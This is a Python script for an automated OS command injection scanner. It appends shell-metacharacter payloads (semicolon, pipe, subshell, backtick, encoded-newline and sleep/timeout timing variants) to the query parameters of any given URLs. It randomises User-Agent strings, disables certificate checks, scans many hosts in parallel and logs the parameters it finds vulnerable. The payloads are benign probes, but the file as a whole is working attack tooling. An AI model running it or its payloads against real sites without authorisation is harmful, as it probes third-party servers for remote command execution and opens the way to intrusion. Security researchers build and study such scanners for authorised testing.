import requests
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style
from tqdm import tqdm  # For progress bar
import time
import random
import logging
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Enhanced payloads for OS Command Injection
PAYLOADS = [
    "test;echo injecteddd",             # Unix-based
    "test|echo injecteddd",             # Unix-based with pipe
    "test$(echo injecteddd)",           # Unix-based with sub-shell
    "test`echo injecteddd`",            # Unix-based with backticks
    "& echo injecteddd",                # Windows/Unix
    "| echo injecteddd",                # Windows/Unix
    "|| echo injecteddd",               # Logical OR command injection
    "%0a echo injecteddd",              # Encoded newline
    "; sleep 5",                      # Timing-based for Unix
    "&& timeout 5",                   # Timing-based for Windows
]

SUCCESS_INDICATOR = "injecteddd"  # Look for this in responses
TIME_THRESHOLD = 4              # Seconds to consider a timing attack successful

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]


def send_os_command_injection_payload(url, param_name, payload, headers):
    """
    Send an OS Command Injection payload and analyze the response.
    """
    try:
        # Parse URL and inject payload
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param_name] = payload
        injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(params, doseq=True)}"

        # Add randomized User-Agent
        headers["User-Agent"] = random.choice(USER_AGENTS)

        start_time = time.time()
        response = requests.get(injected_url, headers=headers, timeout=10, verify=False)
        elapsed_time = time.time() - start_time

        # Check for success indicators
        if SUCCESS_INDICATOR in response.text:
            return True, f"Payload executed. Found indicator: {SUCCESS_INDICATOR}", elapsed_time
        elif elapsed_time > TIME_THRESHOLD:
            return True, f"Timing-based attack succeeded. Response time: {elapsed_time:.2f}s", elapsed_time

    except requests.RequestException as e:
        logging.error(f"Request failed for {url} with payload {payload}: {str(e)}")
        return False, f"Request failed: {str(e)}", 0

    return False, None, 0


def scan_os_command_injection_in_url(url, headers):
    """
    Scan a single URL for OS Command Injection vulnerabilities.
    """
    vulnerable = []
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    for param_name in params:
        for payload in PAYLOADS:
            is_vulnerable, response, elapsed_time = send_os_command_injection_payload(url, param_name, payload, headers)
            if is_vulnerable:
                vulnerable.append((url, param_name, payload, response, elapsed_time))
                break  # Stop testing other payloads if one succeeds

    return vulnerable


def scan_os_command_injection(urls, headers=None, output_file="vulnerabilities.txt"):
    """
    Scan a list of URLs for OS Command Injection vulnerabilities with a progress bar.
    """
    headers = headers or {}
    print(Fore.CYAN + "[*] Starting OS Command Injection scan...\n" + Style.RESET_ALL)
    vulnerable_urls = []

    with tqdm(total=len(urls), desc="Scanning URLs") as pbar:
        def scan_url(url):
            result = scan_os_command_injection_in_url(url, headers)
            pbar.update(1)  # Update the progress bar
            return result

        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(scan_url, urls)

        for result in results:
            if result:
                vulnerable_urls.extend(result)

    # Output results
    if vulnerable_urls:
        print(Fore.GREEN + f"\n[✓] OS Command Injection vulnerabilities found in {len(vulnerable_urls)} parameters.\n" + Style.RESET_ALL)
        with open(output_file, "w") as file:
            for url, param, payload, evidence, elapsed_time in vulnerable_urls:
                result = (
                    f"URL: {url}\n"
                    f"Parameter: {param}\n"
                    f"Payload: {payload}\n"
                    f"Evidence: {evidence}\n"
                    f"Response Time: {elapsed_time:.2f}s\n"
                    "----------------------------------------\n"
                )
                print(Fore.RED + f"[!] Vulnerable URL: {url}")
                print(Fore.YELLOW + f"    Parameter: {param}, Payload: {payload}")
                print(Fore.GREEN + f"    Evidence: {evidence} (Response Time: {elapsed_time:.2f}s)\n" + Style.RESET_ALL)
                file.write(result)
    else:
        print(Fore.YELLOW + "\n[!] No OS Command Injection vulnerabilities found.\n" + Style.RESET_ALL)

    return vulnerable_urls


